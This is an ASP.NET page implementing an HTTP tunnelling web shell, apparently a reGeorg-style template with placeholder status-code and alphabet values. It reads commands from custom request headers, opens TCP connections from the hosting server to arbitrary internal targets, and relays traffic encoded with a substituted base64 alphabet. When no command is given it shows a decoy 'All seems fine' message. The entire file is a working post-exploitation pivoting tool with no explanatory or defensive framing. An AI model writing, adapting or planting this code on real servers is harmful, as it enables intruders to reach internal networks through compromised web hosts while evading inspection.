<%@ Page Language="C#" EnableSessionState="True"%>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Collections" %>
<script runat="server">
    public String StrTr(string input, string frm, string to) {
        String r = "";
        for(int i=0; i< input.Length; i++) {
            int index = frm.IndexOf(input[i]);
            if(index != -1)
                r += to[index];
            else
                r += input[i];
        }
        return r;
    }
</script>
<%
    try
    {
        Response.StatusCode = HTTPCODE;
        String en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        String de = "BASE64 CHARSLIST";
        String cmd = Request.Headers.Get("X-CMD");
        if (cmd != null) {
            String mark = cmd.Substring(0,22);
            cmd = cmd.Substring(22);
            if (cmd == "CONNECT") {
                try {
                    String target_str = System.Text.Encoding.Default.GetString(Convert.FromBase64String(StrTr(Request.Headers.Get("X-TARGET"), de, en)));
                    String[] target_ary = target_str.Split('|');
                    String target = target_ary[0];
                    int port = int.Parse(target_ary[1]);
                    IPAddress ip;
                    try {
                        ip = IPAddress.Parse(target);
                    } catch (Exception ex) {
                        IPHostEntry host = Dns.GetHostByName(target);
                        ip = host.AddressList[0];
                    }
                    System.Net.IPEndPoint remoteEP = new IPEndPoint(ip, port);
                    Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    sender.Connect(remoteEP);
                    sender.Blocking = false;
                    Session.Add(mark, sender);
                    Response.AddHeader("X-STATUS", "OK");
                } catch (Exception ex) {
                    Response.AddHeader("X-ERROR", "Failed connecting to target");
                    Response.AddHeader("X-STATUS", "FAIL");
                }
            } else if (cmd == "DISCONNECT") {
                try {
                    Socket s = (Socket)Session[mark];
                    s.Close();
                } catch (Exception ex){
                }
                Session.Remove(mark);
            } else if (cmd == "FORWARD") {
                Socket s = (Socket)Session[mark];
                try {
                    int buffLen = Request.ContentLength;
                    byte[] buff = new byte[buffLen];
                    int c = 0;
                    while ((c = Request.InputStream.Read(buff, 0, buff.Length)) > 0) {
                        string b64 = StrTr(System.Text.Encoding.Default.GetString(buff), de, en);
                        s.Send(Convert.FromBase64String(b64));
                    }
                    Response.AddHeader("X-STATUS", "OK");
                } catch (Exception ex) {
                    Response.AddHeader("X-ERROR", "POST request read filed");
                    Response.AddHeader("X-STATUS", "FAIL");
                }
            } else if (cmd == "READ") {
                try {
                    Socket s = (Socket)Session[mark];
                    int c = 0;
                    byte[] readBuff = new byte[513];
                    try {
                        while ((c = s.Receive(readBuff)) > 0) {
                            byte[] newBuff = new byte[c];
                            System.Buffer.BlockCopy(readBuff, 0, newBuff, 0, c);
                            string b64 = Convert.ToBase64String(newBuff);
                            Response.BinaryWrite(Encoding.Default.GetBytes(StrTr(b64, en, de)));
                        }
                        Response.AddHeader("X-STATUS", "OK");
                    } catch (SocketException soex) {
                        Response.AddHeader("X-STATUS", "OK");
                    }
                } catch (Exception ex) {
                    Response.AddHeader("X-STATUS", "OK");
                }
            }
        } else {
            Session["l"]=true;
            Response.Write("Georg says, 'All seems fine'");
        }
    } catch (Exception ex) {
        Response.AddHeader("X-STATUS", "FAIL");
    }
%>
